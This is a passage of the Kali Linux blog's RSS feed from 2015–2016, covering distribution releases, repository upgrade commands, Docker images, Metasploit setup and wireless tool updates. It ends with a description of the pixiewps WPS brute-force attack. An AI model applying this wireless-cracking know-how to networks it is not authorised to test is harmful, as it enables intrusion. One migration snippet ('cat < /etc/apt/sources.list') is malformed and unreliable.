vectors</strong>. Get your hands dirty and hack our stuff! And did we mention <strong>prizes</strong>? Oh yeah, there will be prizes! Including give aways of <strong>Kali NetHunter devices, Kali Flip laptops, and OffSec Penetration Testing with Kali Linux courses</strong>!</p> <p><p> <a href='https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/images/offsec-playground-thumb-21.png'> <img src="https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/images/offsec-playground-thumb-21.png" alt="" /> </a> </p> </p> <h2 id="area-4-the-wonderful-world-of-kali-arm-devices">Area 4: The wonderful world of Kali ARM devices</h2> <p>One of the most exciting developments in modern Linux is non-traditional computing devices. Kali has always been at the forefront of ARM support, and has aggressively added support for a wide range of unique and <strong>specialized ARM devices</strong>. In this area, you will get a chance to see and go hands-on with a number of these unique devices. Additionally, you will be provided the opportunity to interact directly with Kali Developers!</p> <p><p> <a href='https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/images/RASPBERRY_PI_A_PLUS_01.png'> <img src="https://www.kali.org/blog/kali-dojo-black-hat-vegas-2016/images/RASPBERRY_PI_A_PLUS_01.png" alt="" /> </a> </p> </p> <h2 id="come-to-the-dojo-and-say-hi">Come to the Dojo and say &ldquo;Hi&rdquo;</h2> <p>We are <strong>extremely excited</strong> about this years Kali Dojo. This new format will facilitate more attendees (no more getting turned away at the door because we are full!) as well as more direct <strong>one on one interaction with Kali Developers</strong> and the OffSec team. If you have even a passing interest in Kali Linux, drop on in and say hi, hit us up with questions, and put Kali to use for a chance to win some awesome prizes! For more information about the Kali Dojo, check the <a href="https://www.blackhat.com/us-16/kali-linux.html">Dojo Black Hat</a> page.</p> <h2 id="kali-linux-20162-release">Kali Linux 2016.2 Release</h2> <p>As we do every year, we will have some fresh pre-release Kali Linux 2016.2 ISOs fresh from the oven exclusively for our students, Dojo attendees and anyone else who wants to peek at our upcoming version of Kali Linux. Our final 2016.2 release will happen once we&rsquo;re back from the conferences and fully recovered.</p></description>
</item>
<item>
<title>Kali Linux 2016.1 Release - Rolling Edition</title>
<link>https://www.kali.org/blog/kali-linux-2016-1-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2016-1-release/</guid>
<pubDate>Thu, 21 Jan 2016 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2016-1-release/images/kali-rolling.jpg" type="image/jpg"/>
<description><h2 id="our-first-release-of-kali-rolling-20161">Our First Release of Kali-Rolling (2016.1)</h2> <p>Today marks an important milestone for us with the first public release of our <strong>Kali Linux rolling distribution</strong>. Kali switched to a rolling release model back when we hit <strong><a href="https://www.kali.org/blog/kali-linux-2-0-release/">version 2.0</a></strong> (codename), however the rolling release was only available via an upgrade from 2.0 to kali-rolling for a select brave group. After 5 months of testing our rolling distribution (and its supporting infrastructure), we&rsquo;re confident in its reliability - giving our users the best of all worlds - the stability of Debian, together with the latest versions of the many outstanding <a href="https://www.kali.org/tools/">penetration testing tools</a> created and shared by the information security community.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2016-1-release/images/kali-rolling-screenshot.png'> <img src="https://www.kali.org/blog/kali-linux-2016-1-release/images/kali-rolling-screenshot.png" alt="" /> </a> </p> </p> <h2 id="whats-new-in-kali-rolling">What&rsquo;s new in Kali Rolling?</h2> <h3 id="kali-rolling-release-vs-standard-releases">Kali Rolling Release vs Standard Releases</h3> <p>To get a better understanding of the changes that this brings to Kali, a clearer picture of <a href="https://www.zdnet.com/article/rolling-release-vs-fixed-release-linux/">how rolling releases work</a> is needed. Rather than Kali basing itself off standard Debian releases (such as Debian 7, 8, 9) and going through the cyclic phases of &ldquo;new, mainstream, outdated&rdquo;, the Kali rolling release feeds continuously from <a href="https://www.debian.org/devel/testing">Debian testing</a>, <strong>ensuring a constant flow of the latest package versions</strong>.</p> <h3 id="continuously-updated-penetration-testing-tools">Continuously Updated Penetration Testing Tools</h3> <p>Our automated notification system of updated penetration testing tool releases has been working well over the past 5 months and has ensured that the kali-rolling repository always holds the latest stable releases of monitored tools. This usually leaves a gap of around 24-48 hours from notification of a new tool update, to its packaging, testing, and pushing into our repositories. We would also like to introduce our new <strong><a href="https://pkg.kali.org/">Kali Linux Package Tracker</a></strong> which allows you to <strong>follow the evolution of Kali Linux both with email updates and a comprehensive web interface</strong>. The tracker can also help in identifying which versions of various tools and packages are in our repository at any given moment. As an example, the screenshot below shows the timeline of the <strong>nmap</strong> package in Kali and tracks its repository versions.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2016-1-release/images/pkg-kali.png'> <img src="https://www.kali.org/blog/kali-linux-2016-1-release/images/pkg-kali.png" alt="" /> </a> </p> </p> <h3 id="vmware-tools-vs-open-vm-tools">VMware Tools vs Open-VM-Tools</h3> <p>This release also marks a dramatic change around how VMware guest tools are installed. As of Sept 2015, VMware <a href="https://kb.vmware.com/kb/2073803">recommends</a> using the distribution-specific <strong>open-vm-tools</strong> instead of the VMware Tools package for guest machines. We have made sure that our package installs and works correctly with the latest Kali rolling kernel and are happy to see that all the needed functionality such as file copying, clipboard copy/paste and automatic screen resizing are working perfectly. To install open-vm-tools in your Kali Rolling image, enter:</p> <pre><code class="language-sh">apt-get update apt-get install open-vm-tools-desktop fuse reboot </code></pre> <h2 id="transitioning-from-kali-20-to-kali-rolling">Transitioning From Kali 2.0 to Kali Rolling</h2> <p>Migrating from Kali sana (2.0) to Kali rolling is simple. As root, you can run the following commands and be on your way:</p> <pre><code class="language-sh">cat &lt; /etc/apt/sources.list deb http://http.kali.org/kali kali-rolling main contrib non-free EOF apt-get update apt-get dist-upgrade # get a coffee, or 10. reboot </code></pre> <p><strong>Please note that the Kali sana repositories will no longer be updated and will be EOL&rsquo;d on the 15th of April 2016.</strong></p> <h2 id="kali-penetration-testing-tools-site-refresh">Kali Penetration Testing Tools Site Refresh</h2> <p>Our on-going mission to give all our Kali sites a facelift and common look and feel has made its way to the <a href="https://www.kali.org/tools/">Kali Tools</a> website. Beyond its clean good looks, the Kali tools site includes descriptions and sample usage for virtually every tool in the Kali Linux arsenal. You can quickly select tools by what they do, such as conducting <a href="https://www.kali.org/tools/kali-meta/#kali-tools-information-gathering">information gathering</a>, cracking <a href="https://www.kali.org/tools/kali-meta/#kali-tools-passwords">passwords</a>, doing <a href="https://www.kali.org/tools/kali-meta/#kali-tools-information-gathering">DNS</a> enumeration, evaluating <a href="https://www.kali.org/tools/kali-meta/#kali-tools-wireless">wireless</a> networks, and much, much more. In addition, we have started adding community driven videos to some of the tool entries, currently taken from <a href="https://twitter.com/10101_Brew">@10101_Brew</a>. Keep them coming!</p> <h2 id="download-kali-linux-rolling-20161">Download Kali Linux Rolling 2016.1</h2> <h2 id="full-light-and-mini-kali-linux-iso-downloads">Full, Light and Mini Kali Linux ISO downloads</h2> <p>We try to keep our release notes to a minimum but there&rsquo;s just so much to say! As with our Kali 2.0 release, we&rsquo;re putting out two ISOs - a full ISO image with Gnome, and a &ldquo;light&rdquo; ISO, which just includes the &ldquo;<a href="https://www.kali.org/docs/general-use/metapackages/">top 10</a>&rdquo; metapackage and XFCE. As usual, feel free to engage the community, report bugs, or join our forums for more discussions about the Kali OS.</p> <p><a href="https://www.kali.org/get-kali/">Download Kali</a></p> <h3 id="kali-rolling-vmware-virtualbox-and-arm-images">Kali Rolling VMware, VirtualBox, and ARM Images</h3> <p>We will be releasing VMware and VirtualBox images of Kali rolling 2016.1 next week via the <a href="https://www.kali.org/get-kali/#kali-vm">OffSec</a> website, as usual. We will also have a barrage of fresh new Kali Rolling ARM images for the various <a href="https://www.kali.org/get-kali/#kali-arm">ARM devices</a> we support. The transition to Kali Rolling in the ARM arena will bring in new opportunities to ARM enthusiasts, as these devices will also enjoy the fresh stream of tool updates in Kali Rolling. Get those Raspberry Pi&rsquo;s warmed up for next week!</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2016-1-release/images/hp-offsec.png'> <img src="https://www.kali.org/blog/kali-linux-2016-1-release/images/hp-offsec.png" alt="" /> </a> </p> </p> <h2 id="shameless-kali-linux-promotions">Shameless Kali Linux Promotions</h2> <p><p> <a href='https://www.kali.org/blog/kali-linux-2016-1-release/images/Screen-Shot-2015-05-06-at-12.50.55-PM-e1430938334257.png'> <img src="https://www.kali.org/blog/kali-linux-2016-1-release/images/Screen-Shot-2015-05-06-at-12.50.55-PM-e1430938334257.png" alt="" /> </a> </p> </p> <h3 id="pwk-awae-and-awe-in-black-hat-usa-2016">PWK, AWAE and AWE in Black Hat USA 2016</h3> <p>We noticed that the <strong><a href="https://www.blackhat.com/us-16/training/index.html">Black Hat USA 2016 training</a></strong> schedule went online today, and figured this would be a good opportunity to give everyone a &ldquo;heads up&rdquo; about it. Our classes usually fill up quickly, and late comers are often disappointed. If you&rsquo;re looking to sign up for one of our courses at BlackHat, our advice is &ldquo;<strong>don&rsquo;t&rsquo; wait</strong>&rdquo;. In addition to our regular courses, we hope to be running another <a href="https://www.kali.org/docs/development/dojo-mastering-live-build/"><strong>Kali Dojo</strong></a>, similar to the 2015 event. Register quickly if you want to join any of these events, you&rsquo;ve been given fair warning!</p> <p><a href="https://www.blackhat.com/us-16/training/penetration-testing-with-kali-linux.html">PWK BHUSA 2016</a> <a href="https://www.blackhat.com/us-16/training/advanced-web-attacks-and-exploitation.html">AWAE BHUSA 2016</a> <a href="https://www.blackhat.com/us-16/training/advanced-windows-exploitation.html">AWE BHUSA 2016&quot;</a></p> <h3 id="oscp-try-harder-and-win-a-nethunter">OSCP? Try Harder and Win a NetHunter</h3> <p>A couple of weeks ago we released a blog post about &ldquo;<a href="https://www.offsec.com/offsec/what-it-means-to-be-oscp/">What it means to be an OSCP</a>&rdquo; in our eyes. If you&rsquo;re an OSCP and would like a chance to Win an <strong>awesome</strong> OnePlus One NetHunter device, go ahead and <a href="https://www.offsec.com/offsec/what-it-means-to-be-oscp/">read our previous blog post</a>! We&rsquo;ve extended the offer till the end of January, when our winner will be announced.</p></description>
</item>
<item>
<title>Kali Moto End of Life & Kali Dojo Slides</title>
<link>https://www.kali.org/blog/kali-moto-eol/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-moto-eol/</guid>
<pubDate>Thu, 15 Oct 2015 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-moto-eol/images/kali-1.x.x-end-of-life-v3.jpg" type="image/jpg"/>
<description><h2 id="kali-sana-release-aftermath">Kali Sana Release Aftermath</h2> <p>Kali Linux 2.0 has been out for a couple of months and the response has been great, with well <strong>over a million unique downloads of Kali 2.0</strong> as a testament. Release day was somewhat hectic for us, as we did not anticipate the sheer volume of traffic  which we somehow always underestimate. In the first few days after the release of 2.0, we had <strong>ten times</strong> the download volume of 1.0 in a similar period, back in 2013.</p> <h2 id="kali-moto-repository-purge">Kali Moto Repository Purge</h2> <p>We&rsquo;ve given Kali Moto (1.0) a good two months of grace time and will be purging the unsupported 1.0 distribution files from our repositories in the next few days. If you&rsquo;re still using Kali 1.0 then it&rsquo;s definitely time to either upgrade or update:</p> <pre><code class="language-sh">cat &lt;&lt; EOF &gt; /etc/apt/sources.list deb http://http.kali.org/kali sana main contrib non-free deb http://security.kali.org/kali-security/ sana/updates main contrib non-free EOF apt-get update apt-get dist-upgrade # get a coffee, or 10. reboot </code></pre> <p>If for some reason you can&rsquo;t upgrade, we&rsquo;ve set aside an archive mirror of Kali 1.0, which can be set as follows:</p> <pre><code class="language-sh">cat &lt;&lt; EOF &gt; /etc/apt/sources.list deb http://old.kali.org/kali moto main contrib non-free EOF </code></pre> <p>Please note, this repository will not be maintained or updated.</p> <h2 id="kali-linux-dojo-2015-materials">Kali Linux Dojo 2015 Materials</h2> <p>It occurred to us that after the BlackHat and DEF CON conferences, we never made a public announcement regarding the availability of our <a href="https://www.kali.org/docs/development/dojo-mastering-live-build/">Kali Linux Dojo 2015 slides</a> and notes. The Dojo was <strong>great fun</strong> - we definitely enjoyed showing our brand spanking new Kali 2.0 to the the crowds, who built their own Kali 2.0 ISOs a day before release.</p> <p><p> <a href='https://www.kali.org/blog/kali-moto-eol/images/dojo-slide-e1444909261539.png'> <img src="https://www.kali.org/blog/kali-moto-eol/images/dojo-slide-e1444909261539.png" alt="" /> </a> </p> </p></description>
</item>
<item>
<title>Kali Linux 2.0 Release - Sana</title>
<link>https://www.kali.org/blog/kali-linux-2-0-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2-0-release/</guid>
<pubDate>Tue, 11 Aug 2015 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2-0-release/images/kali-linux-2-0-release.jpg" type="image/jpg"/>
<description><h2 id="our-next-generation-penetration-testing-platform">Our Next Generation Penetration Testing Platform</h2> <p>We&rsquo;re still buzzing and recovering from the Black Hat and DEF CON conferences where we finished presenting our new [Kali Linux Dojo](](/docs/development/dojo-mastering-live-build/), which was a blast. With the help of <strong>a few good people</strong>, the Dojo rooms were set up ready for the masses - where many <strong>generated their very own Kali 2.0 ISOs for the first time</strong>. But the excitement doesn&rsquo;t end for us just yet. With the end of the cons, we now find ourselves smack in the middle of <strong>the most significant release of Kali since 2013</strong>. Today is the day that Kali 2.0 is officially released.</p> <p><strong>So, what&rsquo;s new in Kali 2.0?</strong> There&rsquo;s a new 4.0 kernel, now based on Debian Jessie, improved hardware and wireless driver coverage, support for a variety of Desktop Environments (gnome, kde, xfce, mate, e17, lxde, i3wm), updated desktop environment and tools - and the list goes on. But these bulletpoint items are essentially a <strong>side effect of the real changes that have taken place</strong> in our development backend. Ready to hear the real news? <strong>Take a deep breath, it&rsquo;s a long list</strong>.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2-0-release/images/tools-slider.png'> <img src="https://www.kali.org/blog/kali-linux-2-0-release/images/tools-slider.png" alt="" /> </a> </p> </p> <h2 id="kali-linux-is-now-a-rolling-distribution">Kali Linux is Now a Rolling Distribution</h2> <p>One of the biggest moves we&rsquo;ve taken to keep Kali 2.0 <strong>up-to-date in a global, continuous manner,</strong> is transforming Kali into a <strong>rolling distribution.</strong> What this means is that we are pulling our packages continuously from <a href="https://www.debian.org/devel/testing">Debian Testing</a> (after making sure that all packages are installable) - essentially upgrading the Kali core system, while allowing us to take advantage of newer Debian packages as they roll out. This move is where our choice in Debian as a base system really pays off - we get to enjoy the stability of Debian, while still remaining <em>on the cutting edge</em>.</p> <h2 id="continuously-updated-tools-enhanced-workflow">Continuously Updated Tools, Enhanced Workflow</h2> <p>Another interesting development in our infrastructure has been the integration of an <strong>upstream version checking system</strong>, which alerts us when new upstream versions of tools are released (usually via git tagging). This script runs daily on a select list of common tools and keeps us alerted if a new tool requires updating. With this new system in place, <strong>core tool updates will happen more frequently</strong>. With the introduction of this new monitoring system, we will slowly start phasing out the &ldquo;tool upgrades&rdquo; option in our <a href="https://bugs.kali.org/">bug tracker</a>.</p> <h2 id="new-flavours-of-kali-linux-20">New Flavours of Kali Linux 2.0</h2> <p>Through our Live Build process, Kali 2.0 now natively supports <strong>KDE, GNOME3, Xfce, MATE, e17, lxde and i3wm</strong>. We&rsquo;ve moved on to <a href="https://www.gnome.org/gnome-3/">GNOME 3</a> in this release, marking the end of a long abstinence period. We&rsquo;ve finally embraced GNOME 3 and with a few custom changes, it&rsquo;s grown to be our favourite desktop environment. We&rsquo;ve added custom support for multi-level menus, true terminal transparency, as well as a handful of useful gnome shell extensions. This however has come at a price - <strong>the minimum RAM requirements for a full GNOME 3 session has increased to 768 MB</strong>. This is a non-issue on modern hardware but can be detrimental on lower-end machines. For this reason, we have also released an official, <strong>minimal Kali 2.0 ISO</strong>. This &ldquo;light&rdquo; flavour of Kali includes a handful of useful tools together with the lightweight <a href="https://www.xfce.org/">Xfce</a> desktop environment - a perfect solution for resource-constrained computers.</p> <h2 id="kali-linux-20-arm-images--nethunter-20">Kali Linux 2.0 ARM Images &amp; NetHunter 2.0</h2> <p>The whole <strong>ARM</strong> image section has been updated across the board with Kali 2.0 - including Raspberry Pi, Chromebooks, Odroids&hellip; The whole lot! In the process, we&rsquo;ve added some new images - such as the latest <strong>Chromebook Flip</strong> - the little beauty here on the right. Go ahead, click on the image, take a closer look. Another helpful change we&rsquo;ve implemented in our ARM images is including kernel sources, for easier compilation of new drivers.</p> <p>We haven&rsquo;t forgotten about <strong>NetHunter</strong>, our favourite mobile penetration testing platform - which also got an update and now includes Kali 2.0. With this, we&rsquo;ve released a whole barrage of new NetHunter images for Nexus 5, 6, 7, 9, and 10. The <strong>OnePlus One</strong> NetHunter image has also been updated to Kali 2.0 and now has a much awaited <strong>image for CM12 as well</strong> - check the <a href="https://www.kali.org/get-kali/#kali-mobile">OffSec NetHunter</a> page for more information.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2-0-release/images/kali-asus-chrome-flipbook-1.png'> <img src="https://www.kali.org/blog/kali-linux-2-0-release/images/kali-asus-chrome-flipbook-1.png" alt="" /> </a> </p> </p> <h2 id="updated-vmware-and-virtualbox-images">Updated VMware and VirtualBox Images</h2> <p>OffSec, the <strong><a href="https://www.offsec.com/courses-and-certifications/">information security training</a></strong> and <strong><a href="https://www.offsec.com/penetration-testing/">penetration testing</a></strong> company behind Kali Linux, has put up new <a href="https://www.kali.org/get-kali/#kali-vm">VMware and VirtualBox Kali 2.0 images</a> for those who want to try Kali in a virtual environment. These include 32 and 64 bit flavours of the GNOME 3 full Kali environment.</p> <p>If you want to build your own virtual environment, you can consult our documentation site on how to install the various <a href="https://www.kali.org/docs/general-use/">virtual guest tools</a> for a smoother experience.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2-0-release/images/kali-vm-images.png'> <img src="https://www.kali.org/blog/kali-linux-2-0-release/images/kali-vm-images.png" alt="" /> </a> </p> </p> <h2 id="tldr-wheres-my-kali-20-download">TL;DR. Where&rsquo;s My Kali 2.0 Download?</h2> <p>The tl;dr of this release is best explained by comparison: If Kali 1.0 was <strong>focused on building a solid infrastructure</strong> then Kali 2.0 is <strong>focused on overhauling the user experience and maintaining updated packages and tool repositories</strong>. Along with the arrival of 2.0 comes a whole lot of interesting updates&hellip; You can head down to our <a href="https://www.kali.org/get-kali/">Kali Linux 2.0 Download</a> page to get the goodness for yourself.</p> <h2 id="still-tl-still-dr-how-do-i-upgrade-to-kali-20">Still TL; Still DR. How Do I Upgrade to Kali 2.0?</h2> <p>Yes, you <strong><em>can</em></strong> upgrade Kali 1.x to Kali 2.0! To do this, you will need to edit your source.list entries, and run a <strong>dist-upgrade</strong> as shown below. If you have been using incorrect or extraneous Kali repositories or otherwise manually installed or overwritten Kali packages outside of <strong>apt</strong>, your upgrade to Kali 2.0 may fail. This includes scripts like lazykali.sh, PTF, manual git clones in incorrect directories, etc. - All of these will clobber existing files on the filesystem and result in a failed upgrade. If this is the case for you, you&rsquo;re better off reinstalling your OS from scratch.</p> <p>Otherwise, feel free to:</p> <pre><code class="language-sh">cat &lt;&lt; EOF &gt; /etc/apt/sources.list deb http://http.kali.org/kali sana main contrib non-free deb http://security.kali.org/kali-security/ sana/updates main contrib non-free EOF apt-get update apt-get dist-upgrade # get a coffee, or 10. reboot </code></pre> <h2 id="metasploit-community--pro-no-longer-ships-in-kali">Metasploit Community / Pro no longer ships in Kali</h2> <p>At the request of Rapid7, we have <strong>removed the Metasploit Community / Pro package</strong> from Kali Linux and now host the Open-source <strong><em>metasploit-framework</em></strong> package only. For all of you who require Community or Pro, you will now need to <strong>download it from Rapid7</strong> and then register and submit your personal details in order to get a license. In addition, <em>the Rapid7 team no longer maintains the Metasploit package in Kali</em>, which has brought with it some substantial changes - we&rsquo;ve moved to a &ldquo;native&rdquo; setup, where rather than bundling all the required software needed to run Metasploit in one big package, we use native dependencies within Kali to support the <strong><em>metasploit-framework</em></strong> package. This results in a <strong>faster, smoother work experience and easier integration</strong> with Metasploit dependencies. For more information about this, check out our <a href="https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/">Metasploit Framework in Kali</a> documentation page.</p> <h3 id="starting-up-metasploit-framework-in-kali-linux-20">Starting up Metasploit Framework in Kali Linux 2.0</h3> <p>Due to the above-mentioned changes in the <strong><em>metasploit-framework</em></strong> package, there are some minor changes in how Metasploit is started in Kali - specifically, there <strong>is no longer a <em>metasploit</em> service</strong>. This is how you start up the Metasploit Framework with database support in Kali Linux 2.0:</p> <pre><code class="language-sh"># Start the Postgresql Database /etc/init.d/postgresql start # Initialize the Metasploit Framework Database msfdb init # Run msfconsole msfconsole </code></pre> <h2 id="your-kali-20-fu-just-got-an-upgrade">Your Kali 2.0 FU Just Got an Upgrade</h2> <p>Kali Linux 2.0 is a serious step forward for us, as we <strong>continuously improve the distribution</strong>. We hope you enjoy the new look, features, tools, and workflow. As usual, you are invited to join our community via <a href="https://forums.kali.org/">forums</a>, <a href="https://bugs.kali.org/">bug tracker</a>, <a href="https://twitter.com/kalilinux">Twitter</a>, <a href="https://www.facebook.com/kalilinux">Facebook</a>, and of course, <a href="https://www.kali.org/docs/community/kali-linux-irc-channel/">IRC</a>. Lastly, if you haven&rsquo;t seen our Kali 2.0 Teaser video, here it is!</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe src="https://www.kali.org/blog/kali-linux-2-0-release/https://player.vimeo.com/video/132329259?dnt=1" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="vimeo video" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe> </div></description>
</item>
<item>
<title>Kali Linux 2.0 Release Day Scheduled</title>
<link>https://www.kali.org/blog/kali-linux-2-release-day-scheduled/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2-release-day-scheduled/</guid>
<pubDate>Mon, 06 Jul 2015 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2-release-day-scheduled/images/kali-2.0-sana.jpg" type="image/jpg"/>
<description><p>We&rsquo;ve been awfully quiet lately, which usually means something is brewing below the surface. In the past few months we&rsquo;ve been working feverishly on our next generation of Kali Linux and we&rsquo;re really happy with how it&rsquo;s looking so far. There&rsquo;s a lot of new features and interesting new aspects to this updated version, however we&rsquo;ll keep our mouths shut until we&rsquo;re done with the release. We won&rsquo;t leave you completely hanging though&hellip;here&rsquo;s a small teaser of things to come!</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe src="https://www.kali.org/blog/kali-linux-2-release-day-scheduled/https://player.vimeo.com/video/132329259?dnt=1" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="vimeo video" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe> </div> <h2 id="kali-20-dojo-at-black-hat--def-con-las-vegas-2015">Kali 2.0 Dojo at Black Hat &amp; DEF CON Las Vegas, 2015</h2> <p>If you&rsquo;re heading down to Black Hat Vegas 2015, join our free <a href="https://www.offsec.com/kali-linux/kali-dojo-bhusa-2015/">Kali 2.0 Dojo workshop</a>, where we will be showcasing some of the most awesome features in Kali 2.0. We are currently working to bring everyone a surprise appearance at DEF CON as well. Unleash the Kraken!</p></description>
</item>
<item>
<title>Official Kali Linux Docker Images Released</title>
<link>https://www.kali.org/blog/official-kali-linux-docker-images/</link>
<guid isPermaLink="true">https://www.kali.org/blog/official-kali-linux-docker-images/</guid>
<pubDate>Tue, 26 May 2015 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/official-kali-linux-docker-images/images/kali-linux-docker-images.jpg" type="image/jpg"/>
<description><p>For the latest information, please see our <a href="https://www.kali.org/docs/containers/official-kalilinux-docker-images/">documentation on Docker</a></p> <p>Last week we received an email from a fellow penetration tester, requesting official <a href="https://registry.hub.docker.com/u/kalilinux/kali-rolling/"><strong>Kali Linux Docker images</strong></a> that he could use for his work. We bootstrapped a minimal Kali Linux 1.1.0a base and registered it under our Kali Linux Docker account. A few minutes later, said fellow pentester was up and running with Metasploit and the Top 10 Kali Linux tools on his Macbook Pro.</p> <h2 id="docker-is-awesome">Docker is Awesome</h2> <p>The more we started looking into Docker and all of its features, the more we realized the endless possibilities of this technology - from helping us in our own internal Kali beta testing, to furthering the reach of Kali to foreign distributions and esoteric operating systems. The fact that you can run Docker on pretty much every operating system under the sun makes this feature extra sexy. The beauty in this process is that Kali is placed in a nice, neat container without polluting your guest filesystem. With this in place, you have full access to all the Kali packages on any and all systems that run Docker - which ends up being quite an expansive list.</p> <h3 id="kali-docker-image-running-on-fedora-21-and-osx-1010-guests">Kali Docker Image Running on Fedora 21 and OSX 10.10 Guests</h3> <p>Figuring out how to use Docker was simple enough. This <a href="https://www.docker.com/tryit/">tutorial</a> does a great job of getting you up and running and showing you the ropes.</p> <p><p> <a href='https://www.kali.org/blog/official-kali-linux-docker-images/images/fedora-docker-kali.png'> <img src="https://www.kali.org/blog/official-kali-linux-docker-images/images/fedora-docker-kali.png" alt="" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/official-kali-linux-docker-images/images/osc-docker-macair.png'> <img src="https://www.kali.org/blog/official-kali-linux-docker-images/images/osc-docker-macair.png" alt="" /> </a> </p> </p> <h3 id="setting-up-a-kali-linux-docker-image">Setting up a Kali Linux Docker Image</h3> <p>Obviously, to get this running, you need to <a href="https://docs.docker.com/installation/">install</a> Docker. For <a href="https://docs.docker.com/installation/mac/">Docker on OSX</a> you can use brew, while for most other distributions, you can install it using your local package manager. Once installed and set up, it&rsquo;s just a matter of pulling our image from the Docker repository:</p> <pre><code class="language-console">muts@macbook-air:~$ docker pull kalilinux/kali-rolling muts@macbook-air:~$ docker run -t -i kalilinux/kali-rolling /bin/bash root@0129d62d2319:/# apt-get update &amp;&amp; apt-get install metasploit-framework </code></pre> <h3 id="building-your-own-kali-linux-docker-image">Building Your Own Kali Linux Docker Image</h3> <p>If you want to build your own Kali images rather than use our pre-made ones, we&rsquo;ve made it easy with the following script hosted on <a href="https://gitlab.com/kalilinux/build-scripts/kali-docker">Kali Linux Docker on GitHub</a>. These images are best built on a Linux system or any other OS that can <strong>debootstrap</strong>:</p> <pre><code class="language-bash">#!/bin/bash # Install dependencies (debootstrap) sudo apt-get install debootstrap # Fetch the latest Kali debootstrap script from git curl &quot;https://gitlab.com/kalilinux/packages/debootstrap.git;a=blob_plain;f=scripts/kali;hb=HEAD&quot; &gt; kali-debootstrap &amp;&amp;\ sudo debootstrap kali ./kali-root http://http.kali.org/kali ./kali-debootstrap &amp;&amp;\ # Import the Kali image into Docker sudo tar -C kali-root -c . | sudo docker import - kalilinux/kali &amp;&amp;\ sudo rm -rf ./kali-root &amp;&amp;\ # Test the Kali Docker Image docker run -t -i kalilinux/kali cat /etc/debian_version &amp;&amp;\ echo &quot;Build OK&quot; || echo &quot;Build failed!&quot; </code></pre> <p>Have fun with your Kali Docker images!</p></description>
</item>
<item>
<title>Pixiewps, Reaver & Aircrack-ng Wireless Penetration Testing Tool Updates</title>
<link>https://www.kali.org/blog/pixiewps-reaver-aircrack-ng-updates/</link>
<guid isPermaLink="true">https://www.kali.org/blog/pixiewps-reaver-aircrack-ng-updates/</guid>
<pubDate>Mon, 04 May 2015 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/pixiewps-reaver-aircrack-ng-updates/images/kali-wireless-tools-update-v2.jpg" type="image/jpg"/>
<description><p>A short while ago, we packaged and pushed out a few important <a href="https://www.kali.org/blog/kali-linux-metapackages/">wireless penetration testing tool</a> updates for aircrack-ng, pixiewps and reaver into Kali&rsquo;s repository. These new additions and updates are fairly significant, and may even change your wireless attack workflows. Here&rsquo;s a short run-down of the updates and the changes they bring.</p> <h2 id="pixiewps---bruteforce-wps-pins-in-seconds">Pixiewps - Bruteforce WPS pins in seconds</h2> <p><a href="https://github.com/wiire-a/pixiewps">Pixiewps</a> is a tool used for offline brute forcing of WPS pins, while exploiting the low or non-existing entropy of some <a href="https://docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHUECQ3o9YhXR91A_p7Nnj5Y/edit?usp=sharing">wireless access points</a> also known as the <strong>pixie dust attack</strong>, discovered by <a href="https://twitter.com/Reversity/status/490978005859454978">Dominique Bongard</a> (<a href="http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf">slides</a> and <a href="http://video.adm.ntnu.no/pres/549931214e18d">video</a>). The pixiewps tool (developed by <a href="https://forums.kali.org/member.php?30454-wiire">wiire</a>), was born out of the Kali forums, and the development of the tool can be tracked throughout an interesting <a href="https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)">forum post</a>.</p> <p>In the correct environment, pixiewps dramatically speeds up the WPS brute force attack time from what was taking up to 12 hours to a <a href="https://www.youtube.com/watch?v=8f6oClT7Wp4">a few seconds</a>. This new attack is mind numbing, and we are somewhat surprised that it hasn&rsquo;t been discussed on a wider basis. Watch our following video closely, and see how we <strong>extract the WPA shared key of this EdiMAX wireless access point in a few seconds</strong> using updated versions of pixiewps and reaver, already packaged in Kali:</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe src="https://www.kali.org/blog/pixiewps-reaver-aircrack-ng-updates/https://player.vimeo.com/video/126489367?dnt=1" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="vimeo video" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe> </div> <h2 id="aircrack-ng-v12-rc2-update">Aircrack-ng v1.2 RC2 